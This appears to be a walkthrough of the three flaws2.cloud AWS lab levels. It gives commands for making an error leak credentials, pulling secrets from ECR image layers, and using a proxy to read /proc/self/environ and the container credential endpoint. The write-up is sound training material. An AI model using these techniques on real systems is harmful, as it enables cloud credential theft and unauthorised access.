<h2>All 3 challenges for this lab can be found at http://flaws2.cloud/ </h2>

<h3>Level 1 Target: http://level1.flaws2.cloud</h3>

Step 1: Often developers will dump environmental variables when error conditions occur in order to help them debug problems.  To test if this occurs here we will capture the ‘Submit’ request in burp suite and change it to a non-number value (since client side only allows numbers to be submitted).  This will cause an error that leaks aws credentials.

Step 2: Configure a new aws profile with these credentials: aws configure –profile flawscloud
When prompted, enter the access key and secret access key.  

Step 3: Open the profile we just configured for flawscloud (this can be found in ~/.aws/credentials) and add the aws_session_token.  

Step 4: Now that we have credentials for an aws account, let’s check what this level1.flaws2.cloud  is: nslookup level1.flaws2.cloud <br>
This returns 52.217.139.141

Step 5: Run the command: nslookup 52.217.139.141 <br>
This returns s3-website-us-east-1.amazonaws.com  

Step 6: Now that we know this is a s3 bucket, let’s check if we can list the s3 bucket for this user: aws --profile flawscloud s3 ls s3://level1.flaws2.cloud  

This returns a list of the s3 bucket. 

Step 7: Copy the secret to our pc: aws --profile flawscloud s3 cp s3://level1.flaws2.cloud/secret-ppxVFdwV4DDtZm8vbQRvhxL8mE6wxNco.html . <br>
Open the secret to solve level1.  

---
<h3>Level 2 Target http://container.target.flaws2.cloud </h3>

Step 1: Visiting the target shows we need credentials to login.

Step 2: Since we are told that this is an ECR and we are told the name of the ECR, let's check if we can list any images on the ecr: aws --profile flawscloud ecr list-images --repository-name level2

Step 3: To list more image digests we will need to get the registryid which is the account number of the user.  To get this, run: aws --profile flawscloud sts get-caller-identity

Step 4: Get a list of image digests: aws --profile flawscloud ecr batch-get-image --repository-name level2 --registry-id 653711331788 --image-ids imageTag=latest |jq '.images[].imageManifest | fromjson'

This has a bunch of different digests.  One of the digests in the output is shown in the below screenshot.

Step 5: Check each one of the digests with the following command (replace --layer-digest value with the different digest values): aws --profile flawscloud ecr get-download-url-for-layer --repository-name level2 --registry-id 653711331788 --layer-digest "sha256:2d73de35b78103fa305bd941424443d520524a050b1e0c78c488646c0f0a0621”

The output for this digest shows a url.  

Step 6: Visiting the long url shown downloads a file.  Searching through the file we find credentials. 

Step 7: Use those credentials to login to http://container.target.flaws2.cloud which completes level 2.  

---
<h3>Level 3 Target: </h3>

Step 1: Seems like the container webserver directs the site to whatever is given after /proxy/.  Based on this, try to access local files: http://container.target.flaws2.cloud/proxy/file:///proc/self/environ 

Step 2: Visit the path’s found on /proc/self/environ: http://container.target.flaws2.cloud/proxy/http://169.254.170.2/v2/credentials/cd0f067f-f28a-4f8a-ba76-0e697ec1d289

This path reveals aws credentials.

Step 3: Configure a new profile user with the found aws credentials: aws configure --profile flawscloud2 <br>
Add the credentials when prompted.

Step 4: Add the aws session token manually into this user profile (found in ~/.aws/credentials).

Step 5: Check if we can find any s3 buckets for this user: aws --profile flawscloud2 s3 ls   

Navigate to the endpoint found on the s3 bucket to complete level 3: http://the-end-962b72bjahfm5b4wcktm8t9z4sapemjb.flaws2.cloud/ 
